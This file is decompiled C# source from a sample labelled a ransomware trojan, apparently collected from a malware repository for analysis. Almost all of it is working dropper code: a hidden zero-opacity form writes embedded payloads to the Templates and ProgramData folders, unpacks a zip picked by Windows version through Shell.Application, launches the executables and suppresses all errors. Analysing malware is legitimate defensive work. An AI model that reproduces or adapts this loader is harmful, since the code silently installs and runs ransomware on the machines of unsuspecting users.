// Decompiled with JetBrains decompiler
// Type: davidharim.Form1
// Assembly: davidharim, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FF5A5CBC-D9C3-4A56-8A78-E91ED9E5D3D5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-72b1b30e4b34a0267f7386974ee024c02a3b3aa62c409de18a497ca23ade20e1.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace davidharim
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    [DebuggerNonUserCode]
    public Form1()
    {
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(0, 0);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    public void UnrdZirp()
    {
      try
      {
        string str1 = "\\Drathvwra\\";
        string str2 = "ravidhtirad";
        object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(System.Type.GetTypeFromProgID("Shell.Application")));
        string path1 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + str1;
        string str3 = Environment.OSVersion.ToString();
        byte[] bytes = !(str3.Contains("6.1") | str3.Contains("6.01")) ? davidharim.My.Resources.Resources.ravidhtirad10 : davidharim.My.Resources.Resources.ravidhtirad07;
        if (!Directory.Exists(path1))
          Directory.CreateDirectory(path1);
        string path2 = path1 + str2;
        if (!File.Exists(path2))
          File.WriteAllBytes(path2 + ".zip", bytes);
        if (!File.Exists(path2 + ".exe".ToString()))
          NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (System.Type) null, "NameSpace", new object[1]
          {
            (object) path1
          }, (string[]) null, (System.Type[]) null, (bool[]) null)), (System.Type) null, "CopyHere", new object[2]
          {
            RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (System.Type) null, "NameSpace", new object[1]
            {
              (object) (path2 + ".zip")
            }, (string[]) null, (System.Type[]) null, (bool[]) null)), (System.Type) null, "Items", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)),
            (object) 4
          }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        Thread.Sleep(410);
        Process.Start(path2 + ".exe".ToString());
        string path3 = "";
        if (!File.Exists(path3))
          return;
        StreamReader streamReader = new StreamReader(path3);
        while (streamReader.Peek() != -1)
          Strings.Split(streamReader.ReadLine(), ",");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void dbsrualbmloadrMde()
    {
      try
      {
        string str1 = Path.GetFileName(Application.ExecutablePath).Split('.')[0];
        davidharim.davidharim davidharim = new davidharim.davidharim();
        string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + str1 + davidharim.file_Ext.ToString();
        File.WriteAllBytes(str2, davidharim.My.Resources.Resources.davidharim);
        Process.Start(str2);
        if (false)
        {
          TextFieldParser textFieldParser = new TextFieldParser("");
          textFieldParser.Delimiters = new string[1]{ "," };
          textFieldParser.TextFieldType = FieldType.Delimited;
          textFieldParser.ReadLine();
          while (!textFieldParser.EndOfData)
          {
            string[] strArray = textFieldParser.ReadFields();
            string str3 = strArray[0];
            string str4 = strArray[1];
            string str5 = strArray[2];
          }
        }
        string path = "";
        if (!File.Exists(path))
          return;
        StreamReader streamReader = new StreamReader(path);
        while (streamReader.Peek() != -1)
          Strings.Split(streamReader.ReadLine(), ",");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      Thread.Sleep(1110);
      this.dbsrualbmloadrMde();
      Thread.Sleep(5100);
      this.UnrdZirp();
      Thread.Sleep(8120);
      try
      {
        this.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e) => Thread.Sleep(1100);
  }
}
